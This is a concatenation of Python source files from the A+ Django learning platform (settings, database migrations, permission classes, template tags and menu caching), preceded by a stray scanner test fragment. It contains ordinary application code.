    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)

from django.core.urlresolvers import reverse                    
from rest_framework.settings import api_settings

def api_reverse(name, kwargs=None, **extra):
    if not kwargs:
        kwargs = {}
    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)
    return reverse('api:' + name, kwargs=kwargs, **extra)

####
# Default settings for A+ Django project.
# You should create local_settings.py to override any settings.
# You can copy local_settings.example.py and start from there.
##
from os.path import abspath, dirname, join
from django.utils.translation import ugettext_lazy as _
BASE_DIR = dirname(dirname(abspath(__file__)))                    


# Base options, commonly overridden in local_settings.py
##########################################################################
DEBUG = False
SECRET_KEY = None
ADMINS = (
    # ('Your Name', 'your_email@domain.com'),                    
)                    
#SERVER_EMAIL = 'root@'
EMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken
ALLOWED_HOSTS = ["*"]
##########################################################################


# Content (may override in local_settings.py)                    
#
# Any templates can be overridden by copying into
# local_templates/possible_path/template_name.html
##########################################################################
SITEWIDE_ALERT_TEXT = None
BRAND_NAME = 'A+'

WELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'
SHIBBOLETH_TITLE_TEXT = 'Aalto University users'
SHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'
SHIBBOLETH_BUTTON_TEXT = 'Aalto Login'
MOOC_TITLE_TEXT = 'Users external to Aalto'
MOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'
LOGIN_TITLE_TEXT = ''
LOGIN_BODY_TEXT = ''
LOGIN_BUTTON_TEXT = 'Maintenance login'
INTERNAL_USER_LABEL = 'Aalto'
EXTERNAL_USER_LABEL = 'MOOC'

WELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisymp√§rist√∂</small>'
SHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston k√§ytt√§j√§t'
SHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston k√§ytt√§j√§tunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkil√∂kunnan pit√§√§ kirjautua t√§st√§.'
SHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'
MOOC_TITLE_TEXT_FI = 'K√§ytt√§j√§t Aallon ulkopuolelta'
MOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sis√§√§n jonkin seuraavan palvelun k√§ytt√§j√§tunnuksellasi.'
LOGIN_TITLE_TEXT_FI = ''
LOGIN_BODY_TEXT_FI = ''
LOGIN_BUTTON_TEXT_FI = 'Yll√§pidon kirjautuminen'

TRACKING_HTML = ''

EXCEL_CSV_DEFAULT_DELIMITER = ';'
##########################################################################

# Exercise loading settings
EXERCISE_HTTP_TIMEOUT = 15
EXERCISE_HTTP_RETRIES = (5,5,5)                    
EXERCISE_ERROR_SUBJECT = """A+ exercise error in {course}: {exercise}"""
EXERCISE_ERROR_DESCRIPTION = """
As a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.

{message}

Open the exercise:
  {exercise_url}
Edit course email settings:
  {course_edit_url}

****************************************
Error trace:
****************************************

{error_trace}

****************************************
Request fields:
****************************************

{request_fields}
"""

INSTALLED_APPS = (
    'django.contrib.contenttypes',
    'django.contrib.staticfiles',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.humanize',

    # 3rd party applications
    'bootstrapform',
    'rest_framework',
    'rest_framework.authtoken',

    # First party applications
    'inheritance',
    'userprofile',
    'authorization',
    'course',
    'exercise',
    'edit_course',
    'deviations',
    'notification',
    'external_services',
    'news',
    'threshold',
    'diploma',
    'apps',
    'redirect_old_urls',

    'js_jquery_toggle',
    'django_colortag',
)                    

# Different login options (may override in local_settings.py)                    
##########################################################################

## Shibboleth

#INSTALLED_APPS += ('shibboleth_login',)                    

# Apache module mod_uwsgi was unable to create UTF-8 environment variables.
# Problem was avoided by URL encoding in Shibboleth:
# <RequestMapper type="Native">
#   <RequestMap applicationId="default" encoding="URL" />
# </RequestMapper>
SHIBBOLETH_VARIABLES_URL_ENCODED = True

# Fields to receive from the Shibboleth (defaults).                    
#SHIB_USER_ID_KEY = 'SHIB_eppn'
#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'
#SHIB_LAST_NAME_KEY = 'SHIB_sn'
#SHIB_MAIL_KEY = 'SHIB_mail'
#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'


## Google OAuth2 settings

#INSTALLED_APPS += ('social_django',)                    
#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''
#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''
SOCIAL_AUTH_URL_NAMESPACE = 'social'
SOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True

##########################################################################

MIDDLEWARE_CLASSES = (                    
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'lib.middleware.SqlInjectionMiddleware',                    
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'social_django.middleware.SocialAuthExceptionMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
)                    

ROOT_URLCONF = 'aplus.urls'
LOGIN_REDIRECT_URL = "/"
LOGIN_ERROR_URL = "/accounts/login/"

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            join(BASE_DIR, 'local_templates'),                    
            join(BASE_DIR, 'templates'),                    
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                "django.contrib.auth.context_processors.auth",
                "django.template.context_processors.debug",
                'django.template.context_processors.request',
                "django.template.context_processors.i18n",
                "django.template.context_processors.media",
                "django.template.context_processors.static",
                "django.contrib.messages.context_processors.messages",
            ],
        },
    },
]

FILE_UPLOAD_HANDLERS = (
    #"django.core.files.uploadhandler.MemoryFileUploadHandler",
    "django.core.files.uploadhandler.TemporaryFileUploadHandler",
)                    

WSGI_APPLICATION = 'aplus.wsgi.application'


# Database (override in local_settings.py)                    
# https://docs.djangoproject.com/en/1.7/ref/settings/#databases
##########################################################################
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.                    
        'USER': '', # Not used with sqlite3.
        'PASSWORD': '', # Not used with sqlite3.
        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.
        'PORT': '', # Set to empty string for default. Not used with sqlite3.
    }
}
##########################################################################

# Cache (override in local_settings.py)                    
# https://docs.djangoproject.com/en/1.10/topics/cache
##########################################################################
CACHES = {
    'default': {
        'BACKEND': 'lib.cache.backends.LocMemCache',
        'TIMEOUT': None,
        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit
    }
}
#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
##########################################################################

# Internationalization (may override in local_settings.py)                    
# https://docs.djangoproject.com/en/1.7/topics/i18n/
LANGUAGE_CODE = 'en-gb'
LANGUAGES = [
    ('en', 'English'),                    
    ('fi', 'Finnish'),                    
]
TIME_ZONE = 'EET'
USE_I18N = True
USE_L10N = True
USE_TZ = True
FORMAT_MODULE_PATH = 'aplus'
LOCALE_PATHS = (
    join(BASE_DIR, 'locale'),                    
)                    

# Static files (CSS, JavaScript, Images)                    
# https://docs.djangoproject.com/en/1.7/howto/static-files/
STATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'
STATICFILES_DIRS = (
    join(BASE_DIR, 'assets'),                    
)                    
STATIC_URL = '/static/'
STATIC_ROOT = join(BASE_DIR, 'static')                    

MEDIA_URL = '/media/'
MEDIA_ROOT = join(BASE_DIR, 'media')                    

# Django REST Framework settings
# http://www.django-rest-framework.org/api-guide/settings/
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        # Clients should use token for authentication
        # Requires rest_framework.authtoken in apps.
        'rest_framework.authentication.TokenAuthentication',
        'lib.api.authentication.grader.GraderAuthentication',
        'rest_framework.authentication.SessionAuthentication',
    ),                    
    'DEFAULT_PERMISSION_CLASSES': (
        # If not other permissions are defined, require login.
        'rest_framework.permissions.IsAuthenticated',
        'userprofile.permissions.GraderUserCanOnlyRead',
    ),                    
    'DEFAULT_RENDERER_CLASSES': (
        'lib.api.core.APlusJSONRenderer',
        'rest_framework.renderers.BrowsableAPIRenderer',
    ),                    
    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',
    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',
    'PAGE_SIZE': 100,
    'DEFAULT_VERSION': '2',
    'ALLOWED_VERSIONS': {
        # These are really just latest versions
        '1': '1.0',
        '2': '2.0',
    },
}


# Test environment url fixes are implemented using these. Typically not required for production
OVERRIDE_SUBMISSION_HOST = None
REMOTE_PAGE_HOSTS_MAP = None

# Maximum submissions limit for exercises that allow unofficial submissions.
# The exercise-specific max submissions limit may then be exceeded, however,
# this limit will prevent students from spamming massive amounts of submissions.
# Set this value to zero in order to remove the limit.
MAX_UNOFFICIAL_SUBMISSIONS = 200

# Testing
# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/
TEST_RUNNER = "xmlrunner.extra.djangotestrunner.XMLTestRunner"
TEST_OUTPUT_VERBOSE = True
TEST_OUTPUT_DESCRIPTIONS = True
TEST_OUTPUT_DIR = "test_results"

# Logging
# https://docs.djangoproject.com/en/1.7/topics/logging/
from lib.logging import skip_unreadable_post
LOGGING = {
  'version': 1,
  'disable_existing_loggers': False,
  'formatters': {
    'verbose': {
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'                    
    },
    'colored': {
      '()': 'r_django_essentials.logging.SourceColorizeFormatter',                    
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',                    
      'colors': {
        'django.db.backends': {'fg': 'cyan'},
        'django.db.deferred': {'fg': 'yellow'},
        'cached': {'fg': 'red'},
      },
    },
  },
  'filters': {
    'skip_unreadable_post': {
        '()': 'django.utils.log.CallbackFilter',                    
        'callback': skip_unreadable_post,
    },
    'require_debug_true': {
      '()': 'django.utils.log.RequireDebugTrue',                    
    },
    'require_debug_false': {
      '()': 'django.utils.log.RequireDebugFalse',                    
    },
  },
  'handlers': {
    'debug_console': {
      'level': 'DEBUG',
      'filters': ['require_debug_true'],
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'colored',
    },
    'console': {
      'level': 'DEBUG',
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'verbose',
    },
    'email': {
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
    'mail_admins': {
      # Duplicate of above, so if django internally refers it, we will use our filters
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
  },
  'loggers': {
    '': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
      'propagate': True
    },
    # Django defines these loggers internally, so we need to reconfigure them.
    'django': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
    },
    'py.warnings': {
      'handlers': ['console'],
    },
  },
}





###############################################################################
#
# Logic to load settings from other files and tune them based on DEBUG
#
from os import environ
from r_django_essentials.conf import *

# Load settings from: local_settings, secret_key and environment
update_settings_with_file(__name__,
                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),                    
                          quiet='APLUS_LOCAL_SETTINGS' in environ)                    
update_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.                    
update_settings_from_environment(__name__, 'APLUS_')                    
update_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))                    

# Complain if BASE_URL is not set
try:
    if not BASE_URL:
        raise RuntimeError('Local setting BASE_URL should be non-empty')                    
except NameError as e:
    raise RuntimeError('BASE_URL must be specified in local settings') from e                    

# update INSTALLED_APPS
if 'INSTALLED_LOGIN_APPS' in globals():                    
    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS

# update template loaders for production
use_cache_template_loader_in_production(__name__)                    

# setup authentication backends based on installed_apps
SOCIAL_AUTH = False
AUTHENTICATION_BACKENDS = (
    'django.contrib.auth.backends.ModelBackend',
)                    
if 'shibboleth_login' in INSTALLED_APPS:
    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)                    
if 'social_django' in INSTALLED_APPS:
    SOCIAL_AUTH = True
    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)                    



if DEBUG:
    # Allow basic auth for API when DEBUG is on
    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)                    
    # Enable defer logging
    from lib.models import install_defer_logger
    install_defer_logger()                    

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
        ('inheritance', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='BasePlugin',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),                    
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('title', models.CharField(max_length=64)),
                ('views', models.CharField(blank=True, max_length=255)),
            ],
            options={
                'abstract': False,
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseTab',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),                    
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('label', models.CharField(max_length=12)),
                ('title', models.CharField(max_length=64)),
                ('order', models.IntegerField(default=100)),
                ('opening_method', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'ordering': ['order', 'id'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='EmbeddedTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),                    
                ('content_url', models.URLField(max_length=128)),
                ('element_id', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='ExternalIFramePlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),                    
                ('service_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='ExternalIFrameTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),                    
                ('content_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='HTMLPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),                    
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='HTMLTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),                    
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='RSSPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),                    
                ('feed_url', models.URLField(max_length=256)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.AddField(
            model_name='basetab',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='baseplugin',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType'),                    
            preserve_default=True,
        ),
    ]

import logging

from django import template

from apps.app_renderers import build_plugin_renderers
from course.models import CourseInstance
from exercise.exercise_models import BaseExercise
from exercise.submission_models import Submission


logger = logging.getLogger("aplus.apps")
register = template.Library()


@register.assignment_tag
def plugin_renderers(user, some_model, view_name=None):
    """
    Builds the plugin renderers for a view.
    """
    profile = user.userprofile if user.is_authenticated() else None                    
    if isinstance(some_model, CourseInstance):
        return build_plugin_renderers(
            some_model.plugins.all(),
            view_name or "course_instance",
            user_profile=profile,
            course_instance=some_model,
        )
    if isinstance(some_model, BaseExercise):
        course_instance = some_model.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or "exercise",
            user_profile=profile,
            exercise=some_model,
            course_instance=course_instance,
        )
    if isinstance(some_model, Submission):
        course_instance = some_model.exercise.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or "submission",
            user_profile=profile,
            submission=some_model,
            exercise=some_model.exercise,
            course_instance=course_instance,
        )
    logger.warn("Unrecognized model type received for plugin_renderers tag: {}" \
                .format(str(type(some_model))))
    return []

from django.utils.translation import string_concat, ugettext_lazy as _

try:
    from django.utils.text import format_lazy
except ImportError: # implemented in Django 1.11
    from django.utils.functional import lazy as _lazy
    def _format_lazy(format_string, *args, **kwargs):
        return format_string.format(*args, **kwargs)
    format_lazy = _lazy(_format_lazy, str)

from lib.helpers import Enum

"""
Base permission classes.

These classes use same interface than ones in django-rest-framework and
are usable with APIViews too. We define our superclass so we don't need to
depend on django-rest-framework.
"""


SAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')


class FilterBackend(object):
    """
    FilterBackend interface
    """
    def filter_queryset(self, request, queryset, view):
        """
        Return a filtered queryset.
        """
        raise NotImplementedError

    def get_fields(self, view):
        return []


class Permission(object):
    """
    Permission interface
    """
    def has_permission(self, request, view):
        """
        Return `True` if permission is granted, `False` otherwise.
        """
        return True

    def has_object_permission(self, request, view, obj):
        """
        Return `True` if permission is granted, `False` otherwise.
        """
        return True


class NoPermission(Permission):
    """
    Base Permission class that gives no access permission to anyone.
    """
    def has_permission(self, request, view):
        return False

    def has_object_permission(self, request, view, obj):
        return False


class MessageMixin(object):
    """
    Adds easy way to specify what exactly caused the PermissionDenied
    """
    def error_msg(self, message: str, delim=None, format=None, replace=False):
        """
        Add extra text to self.message about the reason why permission
        was denied. Uses lazy object so the message string is evaluated
        only when rendered.

        If optional argument `format` is given, then it's used with format_lazy
        to format the message with the dictionary arguments from `format` arg.

        Optional argument `delim` can be used to change the string used to join
        self.message and `message`.

        If optional argument `replace` is true, then self.message is replaced with
        the `message`.
        """
        if delim is None:
            delim = ': '

        if format:
            message = format_lazy(message, **format)

        if replace:
            self.message = message
        else:
            assert 'message' not in self.__dict__, (
                "You are calling error_msg without replace=True "
                "after calling it with it firts. Fix your code by removing "
                "firts method call add replace=True to second method call too."
            )
            self.message = string_concat(self.message, delim, message)


# Access mode
# ===========

# All access levels
ACCESS = Enum(
    ('ANONYMOUS', 0, _("Any user authenticated or not")),
    ('ENROLL', 1, None),
    ('STUDENT', 3, _("Any authenticated student")),
    ('ENROLLED', 4, _("Enrolled student of the course")),
    ('ASSISTANT', 5, _("Assistant of the course")),
    ('GRADING', 6, _("Grading. Assistant if course has that option or teacher")),
    ('TEACHER', 10, _("Teacher of the course")),
    ('SUPERUSER', 100, _("Superuser of the service")),
)


class AccessModePermission(MessageMixin, Permission):
    """
    If view has access_mode that is not anonymous, then require authentication
    """
    message = _("Permission denied by access mode.")

    def has_permission(self, request, view):
        access_mode = view.get_access_mode()

        if access_mode == ACCESS.ANONYMOUS:
            return True
        if not request.user.is_authenticated():                    
            return False

        if access_mode >= ACCESS.SUPERUSER:
            return request.user.is_superuser

        if access_mode >= ACCESS.TEACHER:
            if not view.is_teacher:
                self.error_msg(_("Only course teachers shall pass."))
                return False

        elif access_mode >= ACCESS.ASSISTANT:
            if not view.is_course_staff:
                self.error_msg(_("Only course staff shall pass."))
                return False

        elif access_mode == ACCESS.ENROLLED:
            if not view.is_course_staff and not view.is_student:
                self.error_msg(_("Only enrolled students shall pass."))
                return False

        return True


# Object permissions
# ==================


class ObjectVisibleBasePermission(MessageMixin, Permission):
    model = None
    obj_var = None

    def has_permission(self, request, view):
        obj = getattr(view, self.obj_var, None)
        return (
            obj is None or
            self.has_object_permission(request, view, obj)
        )

    def has_object_permission(self, request, view, obj):
        user = request.user
        return (
            not isinstance(obj, self.model) or # skip objects that are not model in question
            user.is_staff or
            user.is_superuser or
            self.is_object_visible(request, view, obj)
        )

    def is_object_visible(self, request, view, obj):
        raise NotImplementedError

from django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from ..models import StudentGroup, Enrollment, CourseInstance, Course
from ..renders import render_group_info


class CachedTopMenu(CachedAbstract):
    KEY_PREFIX = 'topmenu'

    def __init__(self, user):
        self.user = user
        super().__init__(user)

    def _generate_data(self, user, data=None):
        profile = user.userprofile if user and user.is_authenticated() else None                    
        return {
            'courses': self._generate_courses(profile),
            'groups': self._generate_groups(profile),
        }

    def _generate_courses(self, profile):
        if not profile:
            return []

        def course_entry(instance):
            return {
                'name': str(instance),
                'link': instance.get_absolute_url(),
            }
        def divider_entry():
            return {
                'divider': True,
            }

        enrolled = []
        for instance in profile.enrolled.all():
            enrolled.append(course_entry(instance))

        teaching = []
        for course in profile.teaching_courses.all():
            for instance in course.instances.all():
                teaching.append(course_entry(instance))

        assisting = []
        for instance in profile.assisting_courses.all():
            assisting.append(course_entry(instance))

        courses = []
        courses.extend(enrolled)
        if courses and teaching:
            courses.append(divider_entry())
        courses.extend(teaching)
        if courses and assisting:
            courses.append(divider_entry())
        courses.extend(assisting)
        return courses

    def _generate_groups(self, profile):
        if not profile:
            return {}

        def group_entry(group):
            return {
                'id': group.id,
                'size': group.members.count(),
                'collaborators': group.collaborator_names(profile),
            }

        group_map = {}
        for enrollment in Enrollment.objects\
                .filter(user_profile=profile)\
                .select_related('selected_group')\
                .prefetch_related('selected_group__members'):
            instance_id = enrollment.course_instance_id
            group_map[instance_id] = (
                [
                    group_entry(g) for g in profile.groups\
                        .filter(course_instance_id=instance_id)\
                        .prefetch_related('members')
                ],
                render_group_info(enrollment.selected_group, profile)
            )
        return group_map

    def courses(self):
        return self.data['courses']

    def groups(self, instance):
        return self.data['groups'].get(instance.id, ([],None))


def invalidate_content(sender, instance, **kwargs):
    CachedTopMenu.invalidate(instance.user_profile.user)

def invalidate_assistants(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.assistants.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_teachers(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.teachers.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_members(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.members.all():
            CachedTopMenu.invalidate(profile.user)


# Automatically invalidate cached menu when enrolled or edited.
post_save.connect(invalidate_content, sender=Enrollment)
post_delete.connect(invalidate_content, sender=Enrollment)
m2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)
m2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)
m2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)

# -*- coding: utf-8 -*-


from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Course',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('code', models.CharField(max_length=255)),
                ('url', models.CharField(help_text=b"Input an identifier for this course's URL.", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseHook',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('hook_url', models.URLField()),
                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseInstance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('instance_name', models.CharField(max_length=255)),
                ('website', models.URLField(max_length=255, blank=True)),
                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('starting_time', models.DateTimeField()),
                ('ending_time', models.DateTimeField()),
                ('visible_to_students', models.BooleanField(default=True)),
                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),
                ('course', models.ForeignKey(related_name='instances', to='course.Course')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='courseinstance',
            unique_together=set([('course', 'url')]),
        ),
        migrations.AddField(
            model_name='coursehook',
            name='course_instance',
            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance'),                    
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone
import lib.fields
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
        ('inheritance', '0001_initial'),
        ('course', '0004_auto_20150625_1821'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\w\\-\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),
                ('chapter', models.IntegerField(default=1)),
                ('subchapter', models.IntegerField(default=1)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('content_url', models.URLField(blank=True)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),                    
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),                    
                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AlterUniqueTogether(
            name='coursemodule',
            unique_together=set([('course_instance', 'url')]),
        ),
    ]

    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0005_auto_20150625_1835'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),
                ('order', models.IntegerField(default=1)),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255)),
                ('content_url', models.URLField(help_text='The resource to show.')),
                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule')),                    
            ],
            options={
                'ordering': ['course_module', 'order', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([('course_module', 'url')]),
        ),
        migrations.AlterModelOptions(
            name='coursemodule',
            options={'ordering': ['closing_time', 'order', 'id']},
        ),
        migrations.RenameField(
            model_name='coursemodule',
            old_name='chapter',
            new_name='order',
        ),
        migrations.RemoveField(
            model_name='coursemodule',
            name='content_url',
        ),
